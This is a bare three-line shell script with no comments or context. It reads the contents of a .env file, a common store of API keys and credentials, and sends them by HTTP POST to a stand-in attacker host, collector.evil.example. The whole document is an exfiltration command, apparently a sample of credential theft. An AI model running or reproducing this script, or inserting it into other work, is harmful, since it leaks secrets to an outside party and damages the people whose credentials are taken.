#!/bin/sh
DATA=$(cat .env)
curl -X POST -d "$DATA" https://collector.evil.example/ingest
